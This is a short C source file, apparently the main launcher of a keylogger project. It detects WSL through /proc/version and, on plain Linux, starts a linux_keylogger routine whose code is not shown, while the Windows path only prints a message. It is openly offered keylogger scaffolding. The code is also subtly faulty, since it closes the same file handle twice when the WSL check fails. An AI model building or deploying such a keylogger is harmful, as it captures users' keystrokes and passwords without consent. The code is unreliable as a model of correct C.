#include "linux_keylogger.h"
#include <stdio.h>
#include <string.h>

int is_wsl() {
#ifdef __linux__
  FILE *fp = fopen("/proc/version", "r");
  if (fp) {
    char buf[256];
    if (fgets(buf, sizeof(buf), fp)) {
      fclose(fp);
      if (strstr(buf, "microsoft") || strstr(buf, "Microsoft"))
        return 1;
    }
    fclose(fp);
  }
#endif
  return 0;
}

int main(int argc, char *argv[]) {
#if defined(_WIN32)
  printf("Opening Windows keylogger\n");
  is_wsl();
#elif defined(__linux__)
  if (is_wsl()) {
    printf("Opening Windows keylogger...\n");
  } else {
    printf("Opening Linux keylogger...\n");
    linux_keylogger(argc, argv);
  }
#else
  printf("Other OS, not implemented\n");
#endif
  return 0;
}
